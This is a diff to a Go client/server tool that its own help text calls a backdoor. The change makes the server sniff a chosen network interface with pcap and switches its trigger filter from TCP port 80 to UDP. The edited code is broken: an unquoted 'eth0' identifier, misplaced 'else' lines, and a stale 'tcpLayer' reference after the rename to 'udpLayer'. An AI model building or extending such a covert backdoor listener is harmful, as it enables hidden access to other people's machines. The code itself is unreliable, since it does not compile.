@@ -24,6 +24,7 @@ func main(){
 		" client or server. Defaults to client.");
 	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
 	portPtr := flag.Int("port", 80, "The port to connect to in client mode, or to listen on in server mode. Defaults to 80.");
+	interfacePtr := flag.String("iface", eth0, "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
 
 	flag.Parse();
 
@@ -36,7 +37,7 @@ func main(){
 		break;
 	case "server":
 		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
-		intiateServer();
+		intiateServer(*interfacePtr);
 	}
 }
 
@@ -98,17 +99,19 @@ func intiateClient(ip string, port int){
 	}	
 }
 
-func intiateServer(){
+func intiateServer(iface string){
 
-	if handle, err := pcap.OpenLive("wlan0", 1600, true, pcap.BlockForever); err != nil {
+	if handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever); err != nil {
 		panic(err)
-	} else if err := handle.SetBPFFilter("tcp and port 80"); err != nil {  // optional
+	} 
+	else if err := handle.SetBPFFilter("udp"); err != nil {  
 		panic(err)
-	} else {
+	} 
+	else {
 		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 		for packet := range packetSource.Packets() {
 			layerpacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
-			if tcpLayer := layerpacket.Layer(layers.LayerTypeTCP); tcpLayer != nil {
+			if udpLayer := layerpacket.Layer(layers.LayerTypeUDP); udpLayer != nil {
 				fmt.Println("This is a TCP packet!")
 				tcp, _ := tcpLayer.(*layers.TCP)
 			}
